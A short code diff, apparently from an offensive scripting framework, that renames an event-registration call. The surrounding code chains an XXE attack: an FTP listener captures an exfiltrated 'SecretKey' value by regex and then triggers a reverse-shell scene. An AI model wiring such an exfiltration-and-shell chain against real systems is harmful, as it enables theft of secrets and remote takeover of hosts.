@@ -27,7 +27,7 @@ story.set_debug()
 story.set_proxy('http': 'http://127.0.0.1:8080')
 
 ftpd = services.FTPReader(story)
-ftpd.set_event('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
+ftpd.add_event('xxe', when=events.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
 
 story.add_scene(reverse_shell, when='xxe')
 story.play()
